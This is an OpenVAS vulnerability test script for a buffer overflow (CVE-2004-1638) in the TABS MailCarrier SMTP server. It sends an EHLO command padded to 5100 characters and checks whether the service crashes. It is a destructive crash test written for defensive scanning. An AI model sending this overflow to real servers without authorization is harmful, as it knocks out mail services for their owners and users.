#############################################################################
# OpenVAS Vulnerability Test
#
# TABS MailCarrier SMTP Buffer Overflow Vulnerability
#
# Authors:
# George A. Theall, <theall@tifaware.com>.
#
# Copyright:
# Copyright (C) 2004 George A. Theall
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.15902");
  script_version("2020-08-24T08:40:10+0000");
  script_tag(name:"last_modification", value:"2020-08-24 08:40:10 +0000 (Mon, 24 Aug 2020)");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2004-1638");
  script_bugtraq_id(11535);
  script_xref(name:"OSVDB", value:"11174");
  script_name("TABS MailCarrier SMTP Buffer Overflow Vulnerability");
  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_copyright("Copyright (C) 2004 George A. Theall");
  script_family("SMTP problems");
  script_dependencies("smtpserver_detect.nasl");
  script_require_ports("Services/smtp", 25, 465, 587);
  script_mandatory_keys("smtp/tabs/mailcarrier/detected");

  script_tag(name:"impact", value:"By sending an overly long EHLO command, a remote attacker can crash the SMTP
  service and execute arbitrary code on the target.");

  script_tag(name:"solution", value:"Upgrade to MailCarrier 3.0.1 or later.");

  script_tag(name:"summary", value:"The target is running at least one instance of MailCarrier in which the
  SMTP service suffers from a buffer overflow vulnerability.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("smtp_func.inc");
include("misc_func.inc");
include("port_service_func.inc");

port = smtp_get_port( default:25 );

banner = smtp_get_banner( port:port );
if( ! banner || "TABS Mail Server" >!< banner )
  exit( 0 );

soc = open_sock_tcp( port );
if( ! soc )
  exit( 0 );

vtstrings = get_vt_strings();

# It's MailCarrier and the port's open so try to overflow the buffer.
#
# nb: this just tries to overflow the buffer and crash the service
#     rather than try to run an exploit, like what muts published
#     as a PoC on 10/23/2004. I've verified that buffer sizes of
#     1032 (from the TABS LABS update alert) and 4095 (from
#     smtp_overflows.nasl) don't crash the service in 2.5.1 while
#     one of 5100 does so that what I use here.
c = string( "EHLO ", crap( 5100, vtstrings["uppercase"] ), "\r\n" );

send( socket:soc, data:c );
repeat {
  s = recv_line( socket:soc, length:32768 );
}
until( s !~ '^[0-9]{3}[ -]' );

if( ! s ) {
  close( soc );
  sleep( 2 );
  soc = open_sock_tcp( port );
  if( ! soc ) {
    security_message( port:port );
    exit( 0 );
  } else {
    close( soc );
  }
}

smtp_close( socket:soc, check_data:s );
exit( 99 );
